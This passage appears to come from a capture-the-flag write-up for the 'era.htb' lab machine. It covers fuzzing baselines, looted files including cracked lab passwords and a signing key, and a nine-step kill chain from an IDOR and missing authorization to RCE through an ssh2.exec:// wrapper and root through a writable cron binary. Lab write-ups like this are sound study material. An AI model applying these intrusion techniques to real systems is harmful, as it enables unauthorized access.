**Coverage limit:** `names.txt` is 10,713 first names only. Any account that
isn't a bare forename — role accounts (`support`, `admin`, `ftp`),
`first.last`, or `finitial+lastname` — was outside this run by construction.

**Baselines** — three in play, none interchangeable:

| Target | Baseline | What it is |
|--------|---------:|------------|
| `10.129.50.114` w/ unknown `Host:` | 154 | unknown-vhost response |
| `era.htb` unknown path | 19493 | soft-404 = serves main page |
| `file.era.htb` unknown *extensionless* path | 6765 | falls through to index.php |
| `file.era.htb` unknown `*.php` path | real 404 | no filter needed |

The `.php` run used no `-fs` at all and still returned only 9 rows out of 1.3M
— so missing `.php` files genuinely 404. Inference (unverified): nginx has a
`try_files $uri $uri/ /index.php` style fallback, which catches extensionless
paths but hands `.php` straight to PHP-FPM, which 404s honestly.

---

## 9. Files

| Path | What |
|------|------|
| `scans/scripts.*` | nmap `-p- -sV -sC` |
| `loot/src/` | app source (from `download.php?id=54` / `site-backup-30-08-24.zip`) |
| `loot/src/filedb.sqlite` | user table (backup copy) |
| `loot/hashes.txt` | 6 bcrypt hashes, mode 3200; `eric:america`, `yuri:mustang` cracked |
| `loot/key.pem` | RSA priv key **+** cert `CN=ELF verification` — the root primitive |
| `loot/x509.genkey` | cert-gen config; `string_mask=utf8only` is the tell |
| `loot/signing.zip` | = key.pem + x509.genkey (same two files) |
| `loot/ftp_yuri/` | apache2 + php8.1 config from the vsftpd share (yuri:mustang) |
| `exploits/find_sqlite.sh` | magic-byte SQLite locator (written, optional) |

**Full kill chain**

1. vhost fuzz → `file.era.htb` (PHP app; `era.htb` is a static template)
2. `register.php` open → self-register → cross the auth boundary
3. **IDOR** `download.php?id=` (no ownership check) → source archive (`id=54`)
   + ELF signing keypair (`id=150`)
4. **Missing authz** in `reset.php` → overwrite `admin_ef01cab31aa`'s security
   answers as any logged-in user
5. `security_login.php` with those answers → `$_SESSION['erauser'] = 1`
6. **`ssh2.exec://` stream wrapper** in `download.php`'s admin `show=true`
   branch → RCE against internal `127.0.0.1:22` as **yuri**
7. cracked **`eric:america`** reused for local login → **user.txt**
8. root cron runs `/opt/AV/periodic-checks/monitor`, group-writable by `devs`
   (which `eric` is in), gated by a fake `.text_sig` "signature" grep
9. graft the looted **cert** in as `.text_sig` on our own ELF → root runs it →
   **root.txt**

Two bugs are the same class in different clothes: **input validated in one
context, trusted in another** — `download.php` decides "is this a wrapper?"
from a `://` substring and then hands the whole string to `fopen()`; the
`monitor` check decides "is this signed?" from a grep and then executes as
root. Neither actually verifies what it claims to.
